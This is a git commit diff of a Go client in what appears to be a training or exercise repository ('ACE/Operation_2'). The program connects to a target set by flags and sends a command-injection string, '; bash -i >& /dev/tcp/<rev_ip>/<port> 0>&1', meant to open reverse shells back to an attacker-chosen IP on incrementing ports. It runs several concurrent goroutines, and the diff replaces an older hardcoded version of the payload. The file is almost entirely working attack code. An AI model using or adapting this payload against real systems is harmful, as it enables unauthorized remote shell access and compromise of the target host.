3717f66cf1873f4a30681895b24c03a04a5b6768
Johnathon Beuter <johnathonbeuter@gmail.com>
2024-06-12 06:43:19 -0400

    Spins up 4 routines

--- ACE/Operation_2/Routines/clientRoutines.go
+++ ACE/Operation_2/Routines/clientRoutines.go
@@ -1,24 +1,43 @@
 package main
 
 import (
+	"flag"
 	"fmt"
 	"net"
+	"strconv"
 	"sync"
 )
 
-var wait sync.WaitGroup
+var (
+	port          string
+	ipaddress     string
+	rev_ipaddress string
+	wait          sync.WaitGroup
+)
 
-//10.76.165.15
+// 10.76.165.15
+func init() {
 
-func runConnection() {
-	conn, err := net.Dial("tcp", "localhost:9803")
+	flag.StringVar(&port, "port", "9803", "The port on which to listen for connections")
+	flag.StringVar(&ipaddress, "conn_ip", "localhost", "Target IP")
+	flag.StringVar(&rev_ipaddress, "rev_ip", "localhost", "Reverse shell destination IP")
+}
+
+func runConnection(conn_address string, rev_address string, port string, incrament int) {
+	conn, err := net.Dial("tcp", net.JoinHostPort(conn_address, port))
 	fmt.Println("this is a test")
 	if err != nil {
 		fmt.Println(err)
 		return
 	}
 
-	_, err = conn.Write([]byte("; sh -i >& /dev/tcp/192.168.0.87/9005 0>&1")) //Could this be transmitted and ran?
+	callbackPort := 9005 + incrament
+	callback := strconv.Itoa(callbackPort)
+
+	///Format the string
+	shell := "; bash -i >& /dev/tcp/" + rev_address + "/" + callback + " 0>&1"
+
+	_, err = conn.Write([]byte(shell)) //Could this be transmitted and ran?
 
 	if err != nil {
 		fmt.Println("BROKE")
@@ -32,7 +51,7 @@ func main() {
 	// Connect to the server
 	for i := 0; i < 5; i++ {
 		wait.Add(1)
-		go runConnection()
+		go runConnection(ipaddress, rev_ipaddress, port, i)
 	}
 	wait.Wait()
 }
